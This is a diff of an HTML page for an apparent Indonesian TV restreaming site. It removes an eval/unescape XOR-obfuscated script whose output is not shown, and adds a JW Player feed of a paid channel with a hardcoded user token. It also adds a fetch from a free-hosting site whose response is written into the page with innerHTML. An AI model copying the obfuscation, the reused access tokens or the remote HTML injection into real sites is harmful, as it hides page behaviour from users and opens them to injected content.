@@ -1,16 +1,214 @@
-<html>
+<center><html>
+<style type="text/css">
+a {
+text-decoration:none;
+color:Red;
+display:block;
+font-size:30px;
+}
+
+</style>
 <head>
+<title></title>
 </head>
-<body>
-
+<body bgcolor="#000000"><body text="white">
+<style>
+ @media screen and (min-width: 200px) and (max-width: 567px) and (orientation: landscape) {
+ html {
+    transform: rotate(-90deg);
+    transform-origin: left top;
+    width: 100vh;
+    overflow-x: hidden;
+    position: absolute;
+  }
+}
+@media screen and (min-width: 200px) and (max-width: 767px){
+.sticky {
+  top: 0px;
+  -webkit-box-shadow: 0 0 20px 0 rgba(0, 0, 0, 0.9);
+  -moz-box-shadow: 0 0 20px 0 rgba(0, 0, 0, 0.9);
+  box-shadow: 0 0 20px 0 rgba(0, 0, 0, 0.9);
+  right: 0px;
+  position: fixed;
+  width: 50%;
+  z-index: 1;
+background-color: black;
+border: 1px solid white;
+text-align: center;
+padding-right:24.5%;
+padding-left:24.5%;
+}}
+@media screen and (min-width: 768px) and (max-width: 1300px){
+.sticky {
+  top: 0px;
+  -webkit-box-shadow: 0 0 20px 0 rgba(0, 0, 0, 0.9);
+  -moz-box-shadow: 0 0 20px 0 rgba(0, 0, 0, 0.9);
+  box-shadow: 0 0 20px 0 rgba(0, 0, 0, 0.9);
+  position: fixed;
+  top: 80%;
+  right: 10px;
+  width: 20%;
+  z-index: 1;
+background-color: black;
+border: 1px solid white;
+text-align: center;
+padding-right:0%;
+padding-left:0%;
+}}
+</style>
+<hr />
+<div class="" id="myHeader">
+<div id="http">
+<script src="//content.jwplatform.com/libraries/IDzF9Zmk.js"></script>
+<div id="player">
+</div>
 <script type="text/javascript">
-<!-- 
-eval(unescape('%66%75%6e%63%74%69%6f%6e%20%71%33%32%63%64%30%61%28%73%29%20%7b%0a%09%76%61%72%20%72%20%3d%20%22%22%3b%0a%09%76%61%72%20%74%6d%70%20%3d%20%73%2e%73%70%6c%69%74%28%22%31%36%38%38%39%37%39%37%22%29%3b%0a%09%73%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%30%5d%29%3b%0a%09%6b%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%31%5d%20%2b%20%22%35%37%37%36%34%39%22%29%3b%0a%09%66%6f%72%28%20%76%61%72%20%69%20%3d%20%30%3b%20%69%20%3c%20%73%2e%6c%65%6e%67%74%68%3b%20%69%2b%2b%29%20%7b%0a%09%09%72%20%2b%3d%20%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%28%70%61%72%73%65%49%6e%74%28%6b%2e%63%68%61%72%41%74%28%69%25%6b%2e%6c%65%6e%67%74%68%29%29%5e%73%2e%63%68%61%72%43%6f%64%65%41%74%28%69%29%29%2b%2d%32%29%3b%0a%09%7d%0a%09%72%65%74%75%72%6e%20%72%3b%0a%7d%0a'));
-eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%71%33%32%63%64%30%61%28%27') + '%3a%7d%70%7e%6a%61%41%0a%0b%25%44%6b%6e%62%63%65%27%71%63%75%62%60%77%24%67%79%62%2a%2c%6a%6f%76%2e%7c%6c%61%70%6e%35%26%3c%34%37%76%7c%2a%27%64%77%60%26%23%6b%6b%7c%2a%7d%6d%67%73%6d%3b%24%33%31%3d%7a%7c%2e%26%65%71%63%25%2d%77%70%62%63%78%70%66%72%6d%70%75%3b%25%68%67%79%62%7d%63%66%76%61%2a%27%7a%08%0a%26%63%72%67%68%27%79%09%0d%27%25%25%24%72%7d%67%78%73%6d%75%72%6e%39%25%73%77%72%6a%72%6f%2c%2a%3f%34%67%62%6e%2c%3b%0b%05%26%2a%24%27%72%72%62%75%72%6f%77%70%66%2b%79%72%6e%6d%6d%71%39%25%69%61%6c%7f%26%7e%77%77%39%09%0d%27%25%25%24%7d%62%62%7e%6c%39%26%35%33%37%7f%6d%3b%0b%05%26%2a%24%27%75%7e%66%71%6f%69%77%7d%26%7e%34%24%6f%6f%60%67%62%77%3a%09%08%2b%26%2a%24%77%75%73%6a%73%6c%76%76%38%2b%67%6c%73%74%6a%71%77%62%3a%08%0a%26%2b%7b%07%0a%7a%0b%0a%43%6a%60%61%6d%67%2b%71%6d%72%62%63%76%23%66%77%61%24%2e%66%6f%78%29%7c%6f%60%77%6f%3b%25%32%36%3b%76%72%2d%27%67%76%67%27%2d%68%65%7e%26%7d%63%60%73%6e%3a%23%3c%3f%3e%74%7e%22%79%07%0a%35%71%70%6a%60%6a%7c%24%79%06%08%2a%24%73%75%74%3d%27%35%75%7c%39%06%08%2a%24%2a%7d%61%65%68%6c%71%29%60%78%7e%27%73%6f%67%60%70%7c%3b%25%34%26%3b%26%3c%34%77%7e%24%33%27%73%6e%62%67%23%36%26%24%37%2a%24%33%2b%25%35%36%3f%22%39%07%0a%27%26%29%6e%74%7b%28%62%75%73%2b%7d%6c%66%62%77%78%39%25%35%24%36%2b%30%3a%74%7f%26%34%23%71%6e%63%65%2e%3b%2a%2a%34%2b%26%34%2f%27%35%37%3d%2f%34%0b%04%24%27%60%77%7b%2a%72%6d%65%62%78%7d%34%24%37%26%34%23%31%35%75%7c%26%3b%26%7c%6f%61%67%2c%33%2b%25%35%28%26%3b%2a%2a%34%35%3f%2d%3c%0a%0b%25%24%70%62%6d%62%70%39%26%34%73%7f%3a%08%0a%26%2b%76%79%73%6e%72%6d%70%75%3b%25%6e%6f%73%63%6e%3b%0a%08%24%23%7c%6c%61%70%6e%35%26%3f%34%22%39%09%0d%27%25%7b%29%6f%79%62%6f%7c%39%26%35%3c%0a%0b%63%65%61%64%6d%7c%77%72%74%60%2e%60%76%69%77%70%35%26%6c%68%66%61%6b%3c%0a%0b%63%77%70%6f%63%7c%3a%27%37%74%7b%27%72%76%68%6f%6f%26%71%6c%6e%72%61%3c%0a%0b%71%61%7e%7f%2b%6b%68%6e%6d%76%3d%27%62%60%76%72%6e%70%35%09%09%76%65%67%63%6c%77%6f%2b%7d%6f%61%6c%73%38%32%37%35%30%20%3b%0b%05%76%6b%60%63%6f%76%68%2a%69%60%6e%72%35%30%3e%36%32%23%3b%0e%09%78%78%09%08%4b%6b%6f%60%6e%67%24%74%60%73%60%61%74%2b%67%78%60%27%2e%69%6a%75%28%7e%6d%62%7f%6e%34%24%3c%3c%3c%73%7f%2c%25%65%74%6f%26%22%69%66%7e%29%78%6e%61%71%6c%38%2b%37%3d%34%37%76%7c%2a%78%08%0b%36%71%7f%6f%6d%6b%7e%26%7b%0e%09%25%25%70%75%7b%38%2a%34%77%7e%3b%0e%09%25%25%29%7d%6e%60%65%6d%73%2b%62%70%7f%28%72%6c%67%6f%75%71%3a%27%36%24%33%27%33%35%74%7e%2b%36%2a%72%6c%60%65%2b%37%29%25%34%2a%2b%36%26%24%37%34%3d%2a%38%08%0b%24%26%26%6b%79%7a%2a%60%77%7b%2a%72%6d%65%62%78%7d%34%24%37%26%34%23%31%35%75%7c%26%3b%26%7c%6f%61%67%2c%33%2b%25%35%28%26%3b%2a%2a%34%35%3f%2d%3c%0a%0b%25%24%60%78%7e%27%73%6f%67%60%70%7c%3b%25%34%26%3b%26%3c%34%77%7e%24%33%27%73%6e%62%67%23%36%26%24%37%2a%24%33%2b%25%35%36%3f%22%39%07%0a%27%26%74%70%70%6c%71%6d%75%79%38%2a%6e%6e%7e%61%67%38%08%0b%24%26%7f%75%7a%3a%27%3e%34%26%38%08%0b%24%26%7d%6f%61%6c%73%38%24%32%37%75%7d%3b%0b%05%26%2a%7f%6e%62%70%6b%39%25%33%34%23%34%0b%04%24%27%78%29%6a%75%61%60%7c%38%2b%37%35%09%09%60%65%64%68%6e%73%77%73%79%62%27%63%74%6a%77%75%39%25%63%68%67%6c%69%35%09%09%60%77%75%63%60%73%3a%26%3a%76%72%24%70%75%68%6a%63%25%7e%6c%6f%7f%63%35%09%09%72%61%7b%73%28%64%68%6f%60%74%34%24%60%63%76%77%62%73%3a%09%08%7b%67%6e%60%6e%74%6f%2e%71%6c%6e%6c%72%35%36%2f%3b%0a%08%74%62%63%61%6c%76%6d%26%6a%6f%6e%73%38%34%26%38%08%0b%79%7b%06%08%36%37%70%72%7d%6f%62%47%08%0a%3a%63%70%2a%37%45%0b%0a%3f%63%6c%7f%24%61%67%67%7d%73%3a%20%22%23%6e%61%38%22%6b%72%4e%6f%65%63%63%72%25%45%08%0b%38%62%62%7c%2a%6d%63%3b%22%6b%73%71%75%22%44%06%08%36%73%60%70%6d%73%73%25%72%72%61%36%20%39%37%60%75%76%77%62%77%71%36%68%70%76%66%65%73%6c%77%75%6a%37%62%77%6b%38%6a%63%62%71%67%72%6a%62%72%36%4d%42%75%4c%33%5a%6a%69%36%6d%70%23%47%38%35%7c%61%7c%6d%77%72%46%0e%09%39%61%6d%7c%2b%6f%6e%39%21%76%68%62%7e%60%73%22%44%06%08%36%37%63%6f%7e%41%0a%0b%39%73%61%7d%6f%7a%70%27%72%7d%73%62%38%23%70%63%73%72%39%6a%66%7c%65%74%60%73%6c%74%72%2d%44%07%0a%69%7d%74%6f%66%7c%60%72%2e%2d%76%66%65%7e%63%72%25%2e%37%73%61%71%62%78%6f%2c%33%3e%34%2f%27%33%3e%34%2f%34%0b%04%24%27%26%24%6d%7c%75%69%65%7f%6e%70%22%2f%77%6a%65%7a%62%73%2e%2d%34%7c%63%7e%71%77%2e%7b%0e%09%25%25%24%26%2b%26%2a%24%6d%6f%68%66%39%25%2e%6c%72%7f%76%34%37%34%70%72%35%35%61%60%76%71%39%72%70%37%70%35%73%33%33%36%6c%76%62%6e%7e%38%69%30%73%3c%40%66%75%75%67%72%72%76%6f%39%7c%63%62%29%72%72%60%72%6f%6f%3b%3f%34%75%37%33%51%37%7f%34%30%74%6f%37%20%70%68%74%39%3b%31%3c%32%30%37%63%70%64%6c%66%77%34%72%30%35%74%2e%61%63%74%6b%69%62%3b%4d%71%63%76%72%6d%67%7d%2d%26%09%09%76%68%62%7e%63%64%63%69%5d%67%7e%61%40%75%76%77%71%76%69%73%38%2b%59%3a%36%3c%33%28%23%36%29%25%35%34%3d%33%26%24%36%34%31%5e%2b%08%0b%24%26%2b%26%2a%24%27%26%70%6a%73%69%60%3a%26%20%6c%79%72%70%67%70%23%73%60%62%6c%2d%27%0b%04%24%27%26%24%23%27%25%25%7f%6f%6f%72%62%3a%27%2d%35%33%37%20%2e%28%0b%05%26%2a%24%27%26%24%23%27%64%72%74%63%6c%72%7c%65%73%6f%77%3d%27%2e%34%3e%38%32%2d%26%09%09%26%24%23%27%25%25%24%26%66%73%7e%61%39%26%6e%62%6b%72%60%28%0b%05%26%2a%24%27%26%24%23%27%73%60%74%63%6a%72%34%24%2c%72%72%76%62%2e%29%09%08%2b%26%2a%24%27%26%24%23%66%70%71%77%71%7f%67%7c%70%39%26%70%75%72%60%29%09%08%2b%26%2a%24%27%26%24%23%77%73%6c%69%67%7d%7f%34%24%2c%6e%70%6e%6b%30%2e%28%0b%05%26%2a%24%27%26%24%23%27%71%7c%74%63%35%26%21%69%30%73%3c%28%2b%08%0b%24%26%2b%26%2a%24%27%26%73%66%73%4f%70%68%6a%7c%61%7c%61%62%74%3a%23%73%73%70%61%2a%06%08%6d%77%75%72%72%70%6b%72%3b%24%72%7d%73%6f%28%0a%08%73%6b%74%7e%42%77%62%6e%38%2a%70%71%73%61%2f%0a%0b%73%61%71%7b%75%78%73%6e%7c%61%3d%27%71%73%71%63%27%0b%04%73%68%6f%76%3d%27%7a%08%0a%26%2b%74%6b%69%62%38%24%25%6c%69%76%7f%20%27%0b%04%24%27%26%24%23%27%25%64%63%72%62%7c%6f%3a%27%20%7f%6b%6e%71%60%22%2a%06%08%2a%24%27%26%24%23%27%6c%77%65%61%7f%6f%70%61%39%26%22%25%2b%08%0b%24%26%2b%26%2a%24%27%60%65%64%68%6e%73%77%73%79%62%34%24%21%20%09%0d%27%25%78%09%08%2b%26%2a%24%7a%2f%3b%0e%09%39%36%73%61%7d%6f%7a%70%45%0b%0a%3f%34%61%6c%7e%44%06%08%36%37%63%6f%7e%41%0a%0b%39%73%61%7d%6f%7a%70%45%0b%0a%78%6e%77%61%77%7d%39%75%78%73%60%70%77%6f%6b%25%38%24%6c%7e%74%6d%70%6e%75%76%2b%2e%25%7a%69%7f%41%73%78%63%73%6f%77%71%2f%2c%78%3b%0b%05%7c%6b%72%27%6e%61%62%63%60%73%24%3b%2b%62%79%63%72%6b%61%71%73%37%6e%61%72%4e%6a%6f%69%62%74%70%45%7e%4c%61%2c%20%66%7f%42%61%66%62%61%75%21%2c%3a%09%08%71%67%7c%24%70%72%6d%64%68%7c%25%39%26%63%63%6b%60%62%70%36%70%6d%6f%72%61%72%5f%75%7a%3b%0a%08%6e%76%75%62%71%6d%75%79%26%67%7d%4d%73%76%64%73%6c%76%76%2e%22%26%75%09%09%26%24%6a%6d%25%2d%7f%6f%79%62%79%7f%35%76%65%68%62%5c%56%6e%6c%7c%63%7e%24%45%3b%24%74%73%6c%62%6b%7f%22%26%75%09%09%26%24%23%27%6d%60%65%62%6e%70%38%63%6b%67%73%74%4b%6c%72%70%34%6a%62%6e%2c%21%71%70%6a%60%6a%7c%22%2f%34%0b%04%24%27%7b%24%66%6b%72%60%24%79%06%08%2a%24%27%26%6c%66%66%61%60%72%34%6c%6a%6b%73%70%4a%6d%74%73%37%73%61%6b%78%7c%6f%2c%21%71%70%6a%60%6a%7c%22%2f%34%0b%04%24%27%7b%09%0d%7a%08%0b%38%35%7c%61%7c%6d%77%72%4616889797%34%38%36%35%34%36%31' + unescape('%27%29%29%3b'));
-// -->
+jwplayer("player").resize(480, 270);
+    jwplayer('player').setup({
+        file: 'http://rr2.dens.tv/s/s04/index.m3u8?app_type=web&userid=50n13N0v14nd1&tkn=829341hrjhaq0q30q&chname=Indosiar',
+playbackRateControls: [0.75, 1, 1.25, 1.5],
+        title: 'forsat tech',
+        width: '100%',
+        aspectratio: '16:9',
+        mute: false,
+        repeat: 'true',
+        autostart: true,
+        primary: 'html5',
+        type: 'm3u8',
+        setFullscreen: true,
+controls: true,
+showCode: true,
+responsive: true,
+skin: {
+  name: "glow",
+       active: "white",
+       inactive: "",
+       background: ""
+  }
+    });
 </script>
-<noscript><i>Javascript required</i></noscript>
+</div>
+</div>
+<script>
+window.onscroll = function() {myFunction()};
+var header = document.getElementById("myHeader");
+var sticky = header.offsetTop;
+function myFunction() {
+  if (window.pageYOffset >= sticky) {
+    header.classList.add("sticky");
+  } else {
+    header.classList.remove("sticky");
+  }
+}
+</script>
+<div style="border: 0px solid blue; font-family: "arial black"; font-size: 15px; font-weight: bolder; padding: 1px 1px;">
+<marquee behavior="scroll" direction="left" onmouseout="run" onmouseover="stop" scrollamount="3" width="375px">
+<script type="text/javascript">
+var message="Selamat Datang Di TV FORSAT TECH Saluran TV Nasional, Admin Forsat_Tech 2022 © All Rights Reserved"
+var bgsGR1color="white" /* Warna utama teks */
+var bgsGR2color="Green" /* Warna teks flash pertama */
+var bgsGR3color="Blue" /* Warna teks flash ke dua */
+var flashspeed=1 // kec. ganti warna (1/1000 dt)
+var flashingletters=50 // jumlah teks pertama
+var flashingletters2=50 // jumlah berwarna teks ke dua
+var flashpause=30 // waktu jeda pergantian warna (1/1000 dtk)
+var n=0
+if (document.all||document.getElementById){document.write('<font color="'+bgsGR1color+'">')
+for (m=0;m<message.length;m++)
+document.write('<span id="neonlight'+m+'">'+message.charAt(m)+'</span>')
+document.write('</font>')}else
+document.write(message)
+function crossref(number){var crossobj=document.all? eval("document.all.neonlight"+number) : document.getElementById("neonlight"+number)
+return crossobj}function neon(){if (n==0){for (m=0;m<message.length;m++)
+crossref(m).style.color=bgsGR1color}
+crossref(n).style.color=bgsGR2color
+if (n>flashingletters-1) crossref(n-flashingletters).style.color=bgsGR3color
+if (n>(flashingletters+flashingletters2)-1) crossref(n-flashingletters-flashingletters2).style.color=bgsGR1color
+if (n<message.length-1)
+n++
+else{n=0
+clearInterval(flashing)
+setTimeout("beginneon()",flashpause)
+return}}
+function beginneon(){if (document.all||document.getElementById)
+flashing=setInterval("neon()",flashspeed)}
+beginneon()
+</script></marquee></div>
+<script>
+                    document.write(new Date().getFullYear() + " &copy; <span class='logoText'>Forsat Tech</span> All Rights Reserved");
+                </script>            
+        </footer>
+        <script>
+var player = document.getElementById('playlist');
+            $(document).ready(function () {
+                        	fetch('https://corsanywhere.herokuapp.com/https://automobilevintagespa.000webhostapp.com/apiforlink.php?token=0wartj9d7xvm90sor1o5')
+  .then((response) => {
+    return response.json();
+  })
+  .then((data) => {
+    console.log(data.message);
+    document.querySelector('marquee').innerHTML = data.message;
+  });
+                setTimeout(() => {
+                    $("#loader").css("display", "none");
+                }, 1000);
+                            //$("#playerContainer").html('<video id="player" playsinline controls data-poster=""><source src="" type="video/mp4" /></video>');
+                var channelButtons = $("[channel]");
+                var i;
+                for (i = 0; i < channelButtons.length; i++) {
+                    channelButtons[i].onclick = function (e) {
+                        var slug = e.currentTarget.getAttribute("channel");
+                                 rmp.setControls(true);
+                                  var src = {
+                                mp4: [slug],
+                            };
+                            //console.log(src);
+                            rmp.setSrc(src);
+                            rmp.play();
+                        };
+                    };
+                                /*RMP Player Initialization*/
+              var src = {
+                        mp4: "https://d2zihajmogu5jn.cloudfront.net/tears-of-steel/playlist.m3u8",
+                    },
+                    settings = {
+                        licenseKey: atob("ZVdabVoyZDJZM0JyZEVBeE5UTXdOakEy"),
+                        autoHeightMode: true,
+                        pip: true,
+                        detectAutoplayCapabilities: true,
+                        autoplay: false,
+                        mutedAutoplayOnMobile: false,
+                        mutedAutoplayOnMacosSafari11Plus: false,
+                        srcChangeAutoplay: true,
+                        skin: "s3",
+                        skinBackgroundColor: "rgba(0, 0, 0, 0.7)",
+                        skinButtonColor: "FFFFFF",
+                        skinAccentColor: "FC801C",
+                        quickRewind: 10,
+                        quickForward: 10,
+                        hideControls: true,
+                        preload: false,
+                        crossorigin: true,
+                        ads:true,
+                        adParser:'rmp-vast',
+                        adTagUrl: 'false',
+                        sharing: false,
+                        contentMetadata: {
+                            artwork: [{ src: "", sizes: "1280x720", type: "image/jpg" }],
+                            poster: [""],
+                            endOfVideoPoster: [""],
+                            thumbnail: "",
+                        },
+                        src: src,
+                    },
+                    elementID = "playerContainer",
+                    rmp = new RadiantMP(elementID),
+                    rmpContainer = document.getElementById(elementID);
 
-</body>
+                rmp.setLoop(true);
+                rmp.init(settings);
+                /*RMP Player initialized*/
+                            });
+        </script>
+    </body>
 </html>
-
